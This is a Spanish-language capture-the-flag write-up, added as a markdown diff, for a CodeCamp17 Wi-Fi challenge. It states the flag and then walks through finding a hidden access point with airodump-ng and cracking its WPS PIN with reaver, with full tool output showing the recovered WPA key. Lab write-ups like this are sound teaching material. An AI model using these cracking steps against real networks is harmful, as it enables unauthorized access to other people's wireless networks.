@@ -1,0 +1,88 @@
+# The love is in the air
+
+<3
+
+R: **CodeCamp17{aHR0cHM6Ly95b3V0dS5iZS9mUUdiWG1rU0Fycwo=}**
+
+
+Hit: //TODO
+
+---------------------------
+
+#Solución
+
+Durante el evento se habilitará un punto de acceso con el ESSID oculto. Haciendo un escaneo se puede ver que existe un AP oculto
+
+```
+$ airmon-ng start wlan0
+$ airodump-ng mon0
+CH 13 ][ Elapsed: 0 s ][ 2017-02-06 00:18
+                                                                                                 
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ 64:16:F0:E0:6F:CF  -45        5        0    0   1  54e  WPA2 CCMP   PSK  <length:  0>
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+```
+
+
+Con herramientas como wash es facil darse cuenta que tiene activado WPS. Curiosamente, es posible realizar un ataque sin saber el ESSID del AP. 
+
+
+```
+$ reaver -i mon0 -b 64:16:F0:E0:6F:CF -vvv
+
+Reaver v1.4-r119 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from 64:16:F0:E0:6F:CF
+[+] Switching mon0 to channel 1
+[+] Associated with 64:16:F0:E0:6F:CF (ESSID: (null))
+[+] Trying pin 12345670
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received WSC NACK
+[+] Sending WSC NACK
+[+] Trying pin 00005678
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received WSC NACK
+[+] Sending WSC NACK
+[+] Trying pin 11865674
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received WSC NACK
+[+] Sending WSC NACK
+[+] Trying pin 16535671
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received M5 message
+[+] Sending M6 message
+[+] Received M7 message
+[+] Sending WSC NACK
+[+] Sending WSC NACK
+[+] Pin cracked in 15 seconds
+[+] WPS PIN: '16535671'
+[+] WPA PSK: 'CodeCamp17{aHR0cHM6Ly95b3V0dS5iZS9mUUdiWG1rU0Fycwo=}'
+[+] AP SSID: 'love'
+```
